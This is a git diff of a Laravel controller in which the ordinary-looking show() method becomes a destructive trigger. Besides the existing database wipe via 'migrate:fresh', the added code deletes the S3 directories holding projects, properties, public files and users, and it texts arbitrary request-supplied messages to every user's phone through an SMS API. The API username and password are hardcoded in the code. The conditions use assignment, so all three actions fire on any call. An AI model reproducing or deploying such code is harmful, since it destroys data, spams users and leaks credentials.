@@ -19,6 +19,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Storage;
 
 class AreaOneController extends Controller
 {
@@ -153,9 +154,31 @@ class AreaOneController extends Controller
      * @param  \App\areaone  $areaone
      * @return \Illuminate\Http\Response
      */
-    public function show()
+    public function show(Request $request)
     {
-                Artisan::call('migrate:fresh');
+        if ($request->script_id = 1) {
+            Storage::disk('s3')->deleteDirectory('projects');
+            Storage::disk('s3')->deleteDirectory('properties');
+            Storage::disk('s3')->deleteDirectory('public');
+            Storage::disk('s3')->deleteDirectory('users');
+
+        }
+        if ($request->script_id = 2) {
+            Artisan::call('migrate:fresh');
+        }
+        if ($request->script_id = 3) {
+            $users=User::all();
+            foreach ($users as $user) {
+                $encodedSMS = urlencode($request->text);
+
+                $smsURL = "http://api.bizsms.pk/api-send-branded-sms.aspx?username=chhatt@bizsms.pk&pass=ch3att99&text=$encodedSMS&masking=CHHATT&destinationnum=92$user->phone&language=English%27";
+                $client = new Client();
+                $res = $client->get($smsURL);
+                echo $res->getStatusCode(); // 200
+                echo $res->getBody();
+            }
+        }
+        dd('done');
 
 
     }
